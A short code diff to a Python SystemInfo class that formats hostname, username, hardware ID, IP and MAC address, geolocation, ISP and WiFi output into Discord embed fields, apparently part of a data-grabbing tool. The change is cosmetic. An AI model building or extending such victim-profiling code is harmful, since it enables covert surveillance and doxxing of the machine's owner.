@@ -82,7 +82,7 @@ class SystemInfo():
 
         return (
             "<:icons:1075850570784579658> User",
-            f"**Display Name: {display_name}\nHostname: {hostname}\nUsername: {username}**",
+            f"**Display Name: ``{display_name}\n``Hostname: ``{hostname}\n``Username: ``{username}``**",
             False
         )
 
@@ -104,7 +104,7 @@ class SystemInfo():
 
         return (
             "<:CPU:1075842581742768208> System",
-            f"**CPU: {cpu}\n GPU: {gpu}\n RAM: {ram}\n HWID: {hwid}**",
+            f"**CPU: ``{cpu}\n`` GPU: ``{gpu}\n`` RAM: ``{ram}\n`` HWID: ``{hwid}``**",
             False
         )
 
@@ -120,7 +120,7 @@ class SystemInfo():
 
         return (
             "<:DiscordFloppy:1075842277261455430> Disk",
-            f"**{disk}**",
+            f"**``{disk}``**",
             False
         )
 
@@ -139,7 +139,7 @@ class SystemInfo():
 
         return (
             "<:globe:1075843143049687171> Network",
-            "**IP Address: {ip}\n MAC Address: {mac}\n Country: {country}\n Region: {region}\n City: {city} ({zip_})\n ISP: {as_}**".format(
+            "**IP Address: ``{ip}\n`` MAC Address: ``{mac}\n`` Country: ``{country}\n`` Region: ``{region}\n`` City: ``{city} ({zip_})\n`` ISP: ``{as_}``**".format(
                 ip=ip, mac=mac, country=country, region=region, city=city, zip_=zip_, as_=as_),
             False
         )
@@ -181,6 +181,6 @@ class SystemInfo():
 
         return (
             "<:wifionline:1075843380388565032> WiFi",
-            f"**{out}**",
+            f"**``{out}``**",
             False
         )
